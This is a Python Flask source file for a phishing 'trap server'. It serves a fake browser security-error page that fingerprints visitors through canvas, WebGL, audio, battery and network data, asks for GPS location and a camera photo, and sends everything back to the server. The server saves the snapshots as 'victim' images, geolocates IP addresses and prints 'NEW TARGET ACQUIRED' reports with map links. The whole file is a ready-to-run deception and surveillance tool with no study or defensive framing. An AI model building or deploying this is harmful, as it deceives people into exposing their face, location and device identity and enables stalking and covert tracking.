import os
import datetime
import json
import base64
import requests
from flask import Flask, request, jsonify, render_template_string
from colorama import init, Fore, Back, Style

# Initialize colorama for terminal colors
init(autoreset=True)

app = Flask(__name__)

DATA_DIR = 'captured_photos'
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

# The Payload: Aggressive Fingerprinting + Social Engineering Camouflage
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update Required</title>
    <style>
        body { background: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #333; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
        h1 { color: #d32f2f; font-size: 24px; margin-bottom: 10px; }
        p { color: #555; font-size: 14px; line-height: 1.5; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #d32f2f; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .progress-bar { width: 100%; background: #e0e0e0; height: 4px; border-radius: 2px; margin-top: 20px; overflow: hidden; }
        .progress-fill { height: 100%; background: #d32f2f; width: 0%; transition: width 0.3s; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h1>System Error</h1>
        <p>Your browser failed a security check. Running diagnostics to verify identity...</p>
        <div class="spinner"></div>
        <div id="status">Initializing...</div>
        <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
    </div>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const statusEl = document.getElementById('status');
        const progressEl = document.getElementById('progress');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        function updateProgress(percent) {
            progressEl.style.width = percent + '%';
        }

        async function collectData() {
            updateProgress(10);
            statusEl.innerText = "Checking hardware integrity...";
            
            const data = {
                fingerprint: null,
                battery: null,
                network: null,
                location: null,
                photo: null,
                system: {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    touchPoints: navigator.maxTouchPoints,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    pdfViewerEnabled: navigator.pdfViewerEnabled,
                    plugins: navigator.plugins.length,
                    referrer: document.referrer,
                    host: window.location.host
                },
                visibility: { hidden: document.hidden, state: document.visibilityState }
            };

            // 1. Advanced Fingerprinting (Canvas & WebGL)
            try {
                const getWebGLInfo = () => {
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (!gl) return null;
                    const debugInfo = gl.getExtension('WEBGL_debug_shaders');
                    return {
                        vendor: gl.getParameter(gl.VENDOR),
                        renderer: gl.getParameter(gl.RENDERER),
                        version: gl.getParameter(gl.VERSION),
                        shader: debugInfo ? gl.getTranslatedShaderSource(gl.createShader(gl.FRAGMENT_SHADER)) : 'N/A'
                    };
                };
                
                const getCanvasFingerprint = () => {
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = "top";
                    ctx.font = "14px Arial";
                    ctx.fillStyle = "#f60";
                    ctx.fillRect(0,0,100,100);
                    ctx.textBaseline = "alphabetic";
                    ctx.fillStyle = "#f60";
                    ctx.fillText("Fingerprint", 2, 2);
                    ctx.fillStyle = "#069";
                    ctx.fillText("Check", 4, 4);
                    return canvas.toDataURL();
                };

                data.fingerprint = {
                    webgl: getWebGLInfo(),
                    canvas: getCanvasFingerprint()
                };
                updateProgress(30);
            } catch (e) { console.error(e); }

            // 2. Audio Context Fingerprinting
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                oscillator.type = 'triangle';
                oscillator.frequency.value = 10000;
                const compressor = audioCtx.createDynamicsCompressor();
                compressor.threshold.value = -50;
                compressor.knee.value = 40;
                compressor.ratio.value = 12;
                compressor.attack.value = 0;
                compressor.release.value = 0.25;
                oscillator.connect(compressor);
                compressor.connect(audioCtx.destination);
                oscillator.start(0);
                updateProgress(40);
            } catch (e) {}

            // 3. Battery
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: battery.level,
                        charging: battery.charging
                    };
                } catch (e) {}
            }
            updateProgress(50);

            // 4. Network
            if (navigator.connection) {
                data.network = {
                    type: navigator.connection.type,
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                };
            }
            updateProgress(60);

            // 5. Location (GPS)
            statusEl.innerText = "Verifying location...";
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, maximumAge: 0 });
                });
                data.location = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
            } catch (e) {
                console.log("GPS Denied or Unavailable. IP Location will be used instead.");
            }
            updateProgress(70);

            // 6. Camera (Silent Attempt)
            statusEl.innerText = "Checking camera access...";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1500)); 
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                data.photo = canvas.toDataURL('image/png').split(',')[1];
                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                console.log("Camera Denied or Unavailable.");
            }
            updateProgress(90);

            statusEl.innerText = "Finalizing...";
            updateProgress(100);
            
            // Send Data
            try {
                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                statusEl.innerText = "Diagnostics complete. You may close this tab.";
            } catch (e) {}
        }

        collectData();
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/log', methods=['POST'])
def log_data():
    try:
        data = request.json
        ip_addr = request.remote_addr
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # IP Intelligence (Fallback for Location)
        ip_info = {"city": "Unknown", "region": "Unknown", "country": "Unknown", "org": "Unknown", "is_proxy": False, "lat": None, "lon": None}
        try:
            # Using ipapi.co for IP intelligence and APPROXIMATE location
            resp = requests.get(f'https://ipapi.co/{ip_addr}/json/', timeout=5).json()
            if 'error' not in resp:
                ip_info = {
                    "city": resp.get('city', 'Unknown'),
                    "region": resp.get('region', 'Unknown'),
                    "country": resp.get('country_name', 'Unknown'),
                    "org": resp.get('org', 'Unknown'),
                    "asn": resp.get('asn', 'Unknown'),
                    "is_proxy": resp.get('proxy', False),
                    "is_tor": resp.get('tor', False),
                    "lat": resp.get('latitude'),  # IP-based Lat
                    "lon": resp.get('longitude')   # IP-based Lon
                }
        except Exception as e:
            print(f"IP Lookup failed: {e}")

        # Process Photo
        photo_path = "None"
        if data.get('photo'):
            filename = f"victim_{ip_addr.replace('.', '_')}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            filepath = os.path.join(DATA_DIR, filename)
            try:
                with open(filepath, "wb") as f:
                    f.write(base64.b64decode(data['photo']))
                photo_path = filepath
            except Exception as e:
                photo_path = f"Error saving photo: {e}"

        # Determine Location for Map Link
        # Priority 1: GPS (High Precision)
        # Priority 2: IP Geolocation (Low Precision - City Level)
        map_link = None
        location_source = "None"
        
        if data.get('location') and data['location'].get('lat') and data['location'].get('lon'):
            lat = data['location']['lat']
            lon = data['location']['lon']
            map_link = f"https://www.google.com/maps?q={lat},{lon}"
            location_source = "GPS (High Precision)"
        elif ip_info.get('lat') and ip_info.get('lon'):
            lat = ip_info['lat']
            lon = ip_info['lon']
            map_link = f"https://www.google.com/maps?q={lat},{lon}"
            location_source = "IP Address (Approximate - City Level)"
        
        # === TERMINAL OUTPUT WITH CLICKABLE MAP ===
        print("\n" + "="*80)
        print(f"{Fore.RED}{Style.BRIGHT}NEW TARGET ACQUIRED{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Timestamp: {timestamp}")
        print(f"{Fore.CYAN}Target IP: {ip_addr}")
        
        if map_link:
            print(f"\n{Fore.BLUE}{Style.BRIGHT}🌍 LIVE LOCATION DETECTED: {location_source}")
            print(f"👉 CLICK TO OPEN IN MAPS: {map_link}")
            if location_source == "IP Address (Approximate - City Level)":
                print(f"   (Note: This is an IP-based estimate for {ip_info['city'], ip_info['region'], ip_info['country']})")
        else:
            print(f"\n{Fore.RED}⚠️ NO LOCATION DATA AVAILABLE (GPS Denied & IP Lookup Failed)")
            print(f"   Target Info: {ip_info['city'], ip_info['region'], ip_info['country']}")

        print(f"\n{Fore.YELLOW}ISP/Organization: {ip_info['org']}")
        if ip_info.get('is_proxy') or ip_info.get('is_tor'):
            print(f"{Fore.RED}WARNING: Target is using Proxy/Tor/VPN!")
        
        print(f"\n{Fore.GREEN}DEVICE FINGERPRINT:")
        sys_info = data.get('system', {})
        print(f"  OS/Platform: {sys_info.get('platform', 'Unknown')}")
        print(f"  Device: {sys_info.get('userAgent', 'Unknown')}")
        print(f"  Screen: {sys_info.get('screen', 'Unknown')}")
        print(f"  Language: {sys_info.get('language', 'Unknown')}")
        print(f"  Timezone: {sys_info.get('timezone', 'Unknown')}")
        
        if data.get('battery'):
            print(f"\n{Fore.MAGENTA}BATTERY STATUS: Level {data['battery'].get('level')} | Charging: {data['battery'].get('charging')}")
        
        if photo_path != "None":
            print(f"\n{Fore.GREEN}PHOTO CAPTURED: {photo_path}")
            print(f"  (Saved to local directory)")
        else:
            print(f"\n{Fore.RED}PHOTO: Failed or Denied by User")

        if data.get('fingerprint') and data['fingerprint'].get('webgl'):
            webgl = data['fingerprint']['webgl']
            print(f"\n{Fore.CYAN}GPU/Hardware ID: {webgl.get('renderer', 'Unknown')}")
        
        print("="*80 + "\n")
        # =======================

        return jsonify({"status": "ok"})
    except Exception as e:
        print(f"Error processing data: {e}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    print(f"{Fore.GREEN}[+] Advanced Trap Server Started...")
    print(f"[+] Waiting for victims. Logs will appear here in real-time.")
    print(f"[+] Photos will be saved to: {os.path.abspath(DATA_DIR)}")
    print(f"[+] CLICKABLE MAP LINKS WILL BE GENERATED IF LOCATION IS FOUND.")
    app.run(host='127.0.0.1', port=5000)